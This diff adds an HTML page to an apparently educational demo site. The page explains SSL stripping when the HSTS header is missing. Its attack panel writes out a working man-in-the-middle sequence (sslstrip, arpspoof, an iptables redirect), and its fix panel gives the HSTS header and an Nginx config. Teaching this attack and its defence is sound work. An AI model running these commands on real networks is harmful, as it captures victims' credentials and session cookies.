@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SSL Stripping — Missing HSTS</title>
+  <style>
+    :root { --dark:#1a1a2e; --card:#16213e; --red:#e74c3c; --green:#27ae60; --text:#eaeaea; --muted:#8899aa; }
+    * { box-sizing:border-box; margin:0; padding:0; }
+    body { font-family:'Segoe UI',system-ui,sans-serif; background:var(--dark); color:var(--text); line-height:1.6; }
+    header { background:linear-gradient(135deg,#1a2a3a,#0a4a7a); padding:2rem; border-bottom:3px solid #3498db; }
+    header h1 { font-size:1.8rem; }
+    header .sub { color:#bde0ff; font-size:0.9rem; margin-top:0.3rem; }
+    nav { padding:0.7rem 2rem; background:#0f1f3a; font-size:0.85rem; }
+    nav a { color:#aac4ff; text-decoration:none; }
+    main { max-width:860px; margin:2rem auto; padding:0 1.5rem; display:flex; flex-direction:column; gap:2rem; }
+    .panel { background:var(--card); border:1px solid #2a3a5c; border-radius:10px; padding:1.5rem; }
+    .panel.attack { border-left:4px solid var(--red); }
+    .panel.fix    { border-left:4px solid var(--green); }
+    .panel h2 { font-size:1.1rem; margin-bottom:1rem; }
+    .panel.attack h2 { color:var(--red); }
+    .panel.fix h2    { color:var(--green); }
+    p { font-size:0.92rem; color:var(--muted); margin-bottom:0.8rem; }
+    code, pre { font-family:'Fira Code',monospace; font-size:0.85rem; background:#0f1f3a; color:#82c4f8; }
+    pre { padding:1rem; border-radius:6px; overflow-x:auto; border:1px solid #1e3a5a; margin:0.8rem 0; }
+    code { padding:0.1rem 0.4rem; border-radius:3px; }
+    ol,ul { padding-left:1.5rem; }
+    ol li, ul li { font-size:0.88rem; color:var(--muted); margin-bottom:0.5rem; }
+    .step-num { display:inline-block; background:var(--red); color:#fff; width:1.4rem; height:1.4rem; border-radius:50%; text-align:center; line-height:1.4rem; font-size:0.75rem; font-weight:700; margin-right:0.5rem; }
+    .header-block { background:#0b1629; border:1px solid var(--green); border-radius:6px; padding:1rem; font-family:monospace; font-size:0.85rem; color:#82f8a4; margin:0.8rem 0; }
+    .flow-diagram {
+      display:flex; flex-direction:column; gap:0.5rem; margin:1rem 0;
+      font-size:0.82rem; font-family:monospace;
+    }
+    .flow-row { display:flex; align-items:center; gap:0.5rem; }
+    .flow-actor { background:#1e3a5a; padding:0.3rem 0.7rem; border-radius:4px; min-width:90px; text-align:center; font-size:0.78rem; }
+    .flow-arrow { color:#4a6fa5; }
+    .flow-label { color:var(--muted); }
+    .flow-label.bad { color:#e74c3c; }
+    .flow-label.mitm { color:#e67e22; background:rgba(230,126,34,0.1); padding:0.1rem 0.4rem; border-radius:3px; }
+    footer { text-align:center; margin:2rem 0 1rem; color:var(--muted); font-size:0.8rem; }
+  </style>
+</head>
+<body>
+<header>
+  <h1>🔓 SSL Stripping / Protocol Downgrade</h1>
+  <div class="sub">Missing header: <code style="background:rgba(0,0,0,0.3);padding:0.1rem 0.4rem;border-radius:3px">Strict-Transport-Security (HSTS)</code></div>
+</header>
+<nav><a href="index.html">← Back to all demos</a></nav>
+
+<main>
+
+  <div class="panel">
+    <h2>📖 What is SSL Stripping?</h2>
+    <p>Even if your site supports HTTPS, the very first request a user makes is usually plain HTTP (they type <code>example.com</code>, not <code>https://example.com</code>). The server responds with a redirect to HTTPS — but that redirect travels over the unencrypted HTTP connection first.</p>
+    <p>An attacker positioned between the victim and the internet (public Wi-Fi, rogue access point, compromised router) can intercept that redirect and replace it, keeping the victim on HTTP indefinitely. This is <strong>SSL stripping</strong>.</p>
+    <p>Without HSTS, the browser has no way to know that it should <em>always</em> use HTTPS before it sees the first response from the server.</p>
+  </div>
+
+  <div class="panel attack">
+    <h2>🔴 The Attack — Man-in-the-Middle on HTTP</h2>
+    <p>Traffic flow <em>without</em> HSTS (victim on a café Wi-Fi controlled by attacker):</p>
+    <div class="flow-diagram">
+      <div class="flow-row">
+        <span class="flow-actor">Browser</span>
+        <span class="flow-arrow">──────→</span>
+        <span class="flow-label bad">[HTTP] GET http://bank.example/</span>
+        <span class="flow-arrow">──────→</span>
+        <span class="flow-actor">Attacker</span>
+      </div>
+      <div class="flow-row" style="padding-left:2rem">
+        <span class="flow-label mitm">Attacker forwards as HTTPS to real server, receives 302 → HTTPS</span>
+      </div>
+      <div class="flow-row">
+        <span class="flow-actor">Browser</span>
+        <span class="flow-arrow">←──────</span>
+        <span class="flow-label bad">[HTTP] 200 OK — stripped, no HTTPS</span>
+        <span class="flow-arrow">←──────</span>
+        <span class="flow-actor">Attacker</span>
+      </div>
+      <div class="flow-row" style="padding-left:2rem">
+        <span class="flow-label mitm">Victim sees "http://" but page looks normal — attacker reads all traffic</span>
+      </div>
+    </div>
+
+    <ol>
+      <li><span class="step-num">1</span>Attacker sets up an ARP spoofing or rogue Wi-Fi access point to intercept traffic.</li>
+      <li><span class="step-num">2</span>Tools like <code>sslstrip</code> (by Moxie Marlinspike) automate the attack: they proxy HTTPS upstream but serve HTTP downstream.</li>
+      <li><span class="step-num">3</span>The victim's browser shows a padlock-free <code>http://</code> URL; credentials and session cookies sent in POST/cookies flow in plaintext.</li>
+      <li><span class="step-num">4</span>Attacker captures login form data, session tokens, credit card numbers — everything sent over the downgraded connection.</li>
+    </ol>
+    <p style="margin-top:0.8rem">Run the demo locally (requires a network interface in promiscuous mode):</p>
+    <pre># Install sslstrip (Kali Linux / Parrot OS)
+sudo apt install sslstrip arpspoof
+
+# Enable IP forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Redirect port 80 traffic through sslstrip
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
+
+# ARP-spoof the victim (replace IP addresses)
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &amp;
+
+# Start sslstrip
+sudo sslstrip -l 10000</pre>
+    <p><em>(Only perform this on networks you own or have explicit permission to test.)</em></p>
+  </div>
+
+  <div class="panel fix">
+    <h2>✅ The Fix — Strict-Transport-Security (HSTS)</h2>
+    <p>HSTS tells the browser: <em>"For the next N seconds, always connect to me via HTTPS — refuse to load this site over HTTP even if asked."</em></p>
+    <div class="header-block">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</div>
+    <p>Directive breakdown:</p>
+    <ul>
+      <li><code>max-age=31536000</code> — remember this for 1 year (recommended minimum).</li>
+      <li><code>includeSubDomains</code> — apply to all subdomains too (prevents stripping on <code>login.example.com</code>).</li>
+      <li><code>preload</code> — opt in to the browser preload list (see below).</li>
+    </ul>
+    <p>In Nginx (must only be sent over HTTPS connections):</p>
+    <pre>server {
+    listen 443 ssl;
+    ...
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+}</pre>
+    <p><strong>HSTS Preloading</strong> solves the "first visit" problem: even before the browser has ever seen the HSTS header, preloaded domains are hardcoded into Chrome, Firefox, Safari, and Edge to always use HTTPS. Submit your domain at <code>hstspreload.org</code>.</p>
+    <p>Traffic flow <em>with</em> HSTS:</p>
+    <div class="flow-diagram">
+      <div class="flow-row">
+        <span class="flow-actor">Browser</span>
+        <span class="flow-arrow">──→</span>
+        <span class="flow-label" style="color:#27ae60">[Browser upgrade] https://bank.example/ — HTTPS before any network packet</span>
+      </div>
+      <div class="flow-row" style="padding-left:2rem">
+        <span class="flow-label" style="color:#27ae60">Attacker can't intercept — TLS established end-to-end</span>
+      </div>
+    </div>
+  </div>
+
+</main>
+<footer>Educational demo — do not use in production.</footer>
+</body>
+</html>
